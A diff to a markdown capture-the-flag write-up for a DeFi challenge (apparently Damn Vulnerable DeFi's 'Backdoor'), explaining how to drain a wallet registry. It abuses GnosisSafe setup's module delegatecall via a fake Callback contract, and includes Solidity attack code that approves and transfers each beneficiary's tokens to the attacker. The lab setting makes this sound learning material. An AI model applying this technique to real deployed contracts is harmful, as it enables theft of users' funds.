@@ -168,7 +168,17 @@ Your goal is to take all funds from the registry. In a single transaction.
 
 # Subverting
 
-As you can see from the challenge's contract, there is only way to get all funds is triggering `proxyCreated()` function. We can trigger this function by creating a proxy with callback.
+As you can see from the challenge's contract, there is only way to get all funds is triggering `proxyCreated()` function. We can **trigger this function by creating a proxy with callback**.
+
+After complete this step, we should pass the following requirement. To skip the condation, **the initial calldata must be called to** `GnosisSafe.setup()`.
+
+```solidity
+ if (bytes4(initializer[:4]) != GnosisSafe.setup.selector) {
+            revert InvalidInitialization();
+}
+```
+
+When we look at the `setup()` function, only the `setupModules()` is **execute a process with calldata param**. So, keep analyze with this function. 
 
 ```solidity
 function setup(
@@ -196,6 +206,8 @@ function setup(
     }
 ```
 
+Yes, we find something helpful to us. It calls `execute()` function within the calldata to complete setup. This means, we can **call our fake callback contract and steal all tokens after creating proxy contract with** `createProxyWithCallback()`!
+
 ```solidity
 function setupModules(address to, bytes memory data) internal {
         require(modules[SENTINEL_MODULES] == address(0), "GS100");
@@ -205,6 +217,8 @@ function setupModules(address to, bytes memory data) internal {
             require(execute(to, 0, data, Enum.Operation.DelegateCall, gasleft()), "GS000");
     }
 ```
+
+Let's see attack contract:
 
 ```solidity
 pragma solidity ^0.8.0;
@@ -240,6 +254,41 @@ contract AttackBackdoor {
             unchecked{++i;}
         }
     }
+}
+```
+
+The `Callback` contract, our fake callback contract which will called by `WalletRegistry`. Then, it will approve every beneficiary's tokens.
+
+```solidity
+contract Callback {
+    function callback(address token, address spender, uint256 drainAmount) external {
+        IERC20(token).approve(spender, drainAmount);
+    }
+}
+```
+
+Get instances of contracts.
+
+```solidity
+Callback callback = new Callback();
+WalletRegistry walletRegistry = WalletRegistry(_walletRegistry);
+IERC20 token = walletRegistry.token();
+GnosisSafeProxyFactory proxyFactory = GnosisSafeProxyFactory(walletRegistry.walletFactory());
+```
+
+In this part of the code, we will use `createProxyWithCallback()` to generate new `GnosisSafeProxy` contracts for each beneficiary. These contracts will be initialized with the `init` variable, and a call to the `Callback.callback()` function will be made when the `setupModules()` is executed.
+
+Finally, we will verify if the `Callback` contract is approved accurately. Afterward, we will transfer 10 ether to our account.
+
+```solidity
+ for (uint i = 0; i < _users.length;) {       
+            address[] memory owners = new address[](1);
+            owners[0] = _users[i];
+            bytes memory init = abi.encodeWithSelector(GnosisSafe.setup.selector,owners,1, address(callback), abi.encodeWithSelector(Callback.callback.selector, address(token), address(this), 10e18),address(0), address(0), 0, address(0));
+            GnosisSafeProxy safeProxy = proxyFactory.createProxyWithCallback(walletRegistry.masterCopy(),init, i,IProxyCreationCallback(_walletRegistry));
+            require(token.allowance(address(safeProxy), address(this)) == 10e18);
+            token.transferFrom(address(safeProxy), msg.sender, 10e18);
+            unchecked{++i;}
 }
 ```
 
